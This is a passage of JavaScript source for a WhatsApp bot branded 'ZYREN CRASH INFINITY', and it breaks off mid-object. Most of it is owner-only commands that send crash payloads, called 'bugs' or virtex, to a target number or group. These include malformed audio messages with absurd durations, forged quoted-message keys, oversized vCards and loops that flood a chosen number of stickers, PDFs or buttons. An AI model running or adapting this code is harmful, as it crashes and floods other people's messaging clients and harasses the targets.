zyren.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
/*BUG WACAP */
case "bugbutton": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
  const buttons = [
  {buttonId: `${prefix}𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`, buttonText: {displayText: cttl}, type: 1},
  {buttonId: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘", buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘", buttonText: {displayText: ngazap}, type: 1}
]

const buttonMessage = {
text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘",
footerText: "Pe",
buttons: buttons,
headerType: 1
}
zyren.sendMessage(m.chat, buttonMessage)
}}
   break
//=================================================//
/*BUG WACAP */
case "vncrash":
if (!isCreator) return onlyOwner()
if (!text) return setReply(`MASUKAN NOMOR TARGET`) 
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
"locationMessage": {}
            } 
        } 
zyren.sendMessage(`${text}@s.whatsapp.net`, {audio: fs.readFileSync("./basetzy/virtex/🍷꙰͜͡𝐏𝐚𝐤𝐓𝐳𝐲💸̷⃨⃛.mp3"), mimetype: "audio/mpeg", ptt:true }, {quoted: adehvn})
await setReply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
//=================================================//
/*BUG WACAP */
case "fotoc":
if (!isCreator) return onlyOwner()
if (!text) return setReply(`MASUKAN NOMOR TARGET`) 
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 9999999999,
"caption": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
            } 
        } 
    }
 hey = global.zy
 zyren.sendMessage(`${text}@s.whatsapp.net`, {image: hey, adehvn, }, {quoted: adehvn})
await setReply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
//=================================================//
/*BUG WACAP */
case "buglist":{
if (!isCreator) return onlyOwner()
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `${place}`,
description: `𝐓𝐑𝐀𝐕𝐀 𝑳𝑰𝑺𝑻 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥`,
buttonText: `𝐂𝐋𝐈𝐂𝐊 ${buttonvirus}`,
footerText: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭`,
listType: "SINGLE_SELECT",
sections: [{
"title": "Menu Bug",
"rows": [
{
"title": `${ngazap(prefix)}`,
"description": "KK",
"rowId": `KK`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "KK",
"description": `${buttonvirus}`,
"rowId": `KK`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": `${cttl}`,
"description": "KK",
"rowId": `KK`
}
]
}
],
  listType: 1
}
}), { userJid: m.chat, quoted: ftroli })
zyren.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
/*BUG WACAP */
case "bughen" : {
if (!isCreator) return onlyOwner()
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@s.whatsapp.net"
a = await zyren.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: "⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄ ‏⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤ ‏⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿ ‏⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄ ‏⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶ ‏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿ ‏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ‏⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿ ‏⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿ ‏⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛ ‏⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄ ‏⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄.."}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄ ‏⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤ ‏⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿ ‏⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄ ‏⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶ ‏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿ ‏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ‏⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿ ‏⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿ ‏⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛ ‏⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄ ‏⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄.."}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄ ‏⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤ ‏⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿ ‏⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄ ‏⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶ ‏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿ ‏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ‏⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿ ‏⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿ ‏⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛ ‏⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄ ‏⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄.."}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
/*BUG WACAP */
case "bugreacgc" : {
if (!isCreator) return onlyOwner()
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@g.us"
a = await zyren.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
zyren.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
case "afk":{
if (isBan) return //sticBanLu(from)
if (!zyren.checkDataName("afk", dataId)) { zyren.createDataId("afk", dataId) }
zyren.addDataId("afk", m.sender, dataId)
setReply(`Kamu telah afk`)
}
break
//=================================================//
case "bug1": {
if (!isCreator) return onlyOwner()
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: aud })
zyren.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
//=================================================//
case "bug2": {
if (!isCreator) return onlyOwner()
zyren.sendMessage(m.chat, { image: { url: "https://telegra.ph/file/842cc1a7658a1c2b94c0c.jpg" }, caption: `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ${ngazap(prefix)}` }, { quoted: ft })
}
break
//=================================================//
case "bug3": {
if (!isCreator) return onlyOwner()
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
zyren.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case "bug4": {
if (!isCreator) return onlyOwner()
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Gv1D2edigPo1Jrqum2Ekou\n\n𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐕𝟏!!🔥`,
"matchedText": "https://chat.whatsapp.com/Gv1D2edigPo1Jrqum2Ekou",
"description": "Undangan Grup WhatsApp",
"title": `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥 ፝⃟${ngazap(prefix)}`,
"previewType": "NONE",					
}
}), { userJid: m.chat, quoted: gcc })
zyren.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case "bug5": {
if (!isCreator) return onlyOwner()
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: lok })
zyren.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
//=================================================//
case "bug6": {
if (!isCreator) return onlyOwner()
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6287726302970",
"matchedText": "https://wa.me/c/6287726302970",
"description": "𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥",
"title": `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: ngetrol })
zyren.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case "bug7": {
if (!isCreator) return onlyOwner()
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   \nitem1.TEL;waid=6281991410940:+6281991410940\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥\nX-WA-BIZ-NAME: Raditt\nEND:VCARD",
}
}), { userJid: m.chat, quoted: kon })
zyren.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//=================================================//
case "bugstik":{
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
zyren.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 ${ngazap(prefix)}`,
"jpegThumbnail": fs.readFileSync("./media/gambarnye/thezyren.jpg"),
}
}
}})
}
}
break
//=================================================//
case "pdfspam":{
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`
for (let i = 0; i < jumlah; i++) {
zyren.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
